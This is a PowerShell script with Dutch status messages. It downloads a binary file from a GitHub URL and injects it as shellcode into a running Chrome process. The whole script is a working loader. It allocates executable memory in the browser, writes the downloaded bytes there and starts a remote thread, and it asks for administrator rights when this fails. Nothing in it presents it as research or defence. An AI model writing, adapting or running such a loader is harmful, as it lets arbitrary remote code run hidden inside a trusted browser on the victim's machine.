$url = "https://raw.githubusercontent.com/Zakelijkgg/niks/main/browser.bin"

if (-not [Environment]::Is64BitProcess) {
    pause
    exit
}

Write-Host "---GEMAAKT DOOR MJBP <3---" -ForegroundColor Cyan
Write-Host "[+] Zoeken naar Chrome processen..." -ForegroundColor Cyan

$edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue

if (-not $edgeProcesses) {
    Write-Host "[*] Chrome niet gevonden, wordt gestart..." -ForegroundColor Yellow
    Start-Process "chrome"
    Start-Sleep 2
    $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
}

if (-not $edgeProcesses) {
    Write-Host "[-] Kon Chrome niet starten!" -ForegroundColor Red
    pause
    exit
}

# ==================== HOOFdVENSTER SELECTEREN ====================
$targetProcess = $edgeProcesses | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -First 1

if (-not $targetProcess) {
    Write-Host "[-] Hoofdvenster niet gevonden" -ForegroundColor Yellow
    $targetProcess = $edgeProcesses | Sort-Object WorkingSet64 -Ascending | Select-Object -First 1
}

$targetPID = $targetProcess.Id
$memoryMB = [math]::Round($targetProcess.WorkingSet64 / 1MB, 1)

Write-Host "[+] PID: $targetPID" -ForegroundColor Green

try {
    $shellcode = (New-Object Net.WebClient).DownloadData($url)
    Write-Host "[+] Download gelukt" -ForegroundColor Green
} catch {
    Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
    pause
    exit
}
Write-Host "-----------------------------------------------"
$size = $shellcode.Length

Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
"@ -Name Win32 -Namespace Native -PassThru

try {
    $hProcess = [Native.Win32]::OpenProcess(0x001F0FFF, $false, $targetPID)
    if ($hProcess -eq [IntPtr]::Zero) {
        throw "OpenProcess mislukt. Run als Administrator!"
    }

    $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAllocEx mislukt" }

    $bytesWritten = [UIntPtr]::Zero
    $success = [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$bytesWritten)
    if (-not $success) { throw "WriteProcessMemory mislukt" }

    [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x20, [ref]$null) | Out-Null

    $hThread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null)
    if ($hThread -eq [IntPtr]::Zero) { throw "CreateRemoteThread mislukt" }
    Write-Host "-----------------------------------------------"
    Write-Host "[+] Injectie succesvol!" -ForegroundColor Green
    Write-Host "[x] Cleanen = END klikken of chrome sluiten" -ForegroundColor Yellow
    Write-Host "[!] LAAT CHROME OPEN STAAN!" -ForegroundColor Red
    Write-Host "---#CLEAN---" -ForegroundColor Pink
} catch {
    Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    if ($hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
}

pause
